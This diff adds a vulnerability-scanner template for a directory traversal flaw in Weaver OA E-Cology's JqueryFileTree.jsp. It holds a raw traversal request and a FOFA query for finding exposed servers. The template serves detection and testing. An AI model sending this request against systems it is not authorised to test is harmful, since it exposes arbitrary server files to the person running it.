@@ -1,0 +1,30 @@
+http:
+- matchers:
+  - condition: and
+    part: body
+    type: word
+    words:
+    - "\u65B0\u5EFA\u76EE\u5F55"
+    - "\u5220\u9664\u76EE\u5F55"
+    - "\u91CD\u547D\u540D"
+  raw:
+  - 'GET /hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/page/resource/userfile/../../
+    HTTP/1.1
+
+    Host: {{Hostname}}
+
+    '
+id: ecology-jqueryfiletree-directory-traversal
+info:
+  author: Co5mos
+  description: "\u6CDB\u5FAEOA E-Cology \u7CFB\u7EDF\u5B58\u5728JqueryFileTree.jsp\
+    \ \u76EE\u5F55\u904D\u5386\u6F0F\u6D1E\u3002\u653B\u51FB\u8005\u53EF\u4EE5\u5229\
+    \u7528\u8BE5\u6F0F\u6D1E\u8BBF\u95EE\u670D\u52A1\u5668\u4E0A\u7684\u4EFB\u610F\
+    \u6587\u4EF6\uFF0C\u4ECE\u800C\u5BFC\u81F4\u4FE1\u606F\u6CC4\u9732\u3002\n"
+  metadata:
+    fofa-query: "app=\"\u6CDB\u5FAE-OA\uFF08e-cology\uFF09\""
+    max-request: 2
+  name: "\u6CDB\u5FAEOA E-Cology JqueryFileTree.jsp \u76EE\u5F55\u904D\u5386\u6F0F\
+    \u6D1E"
+  severity: high
+  tags: lfi,ecology
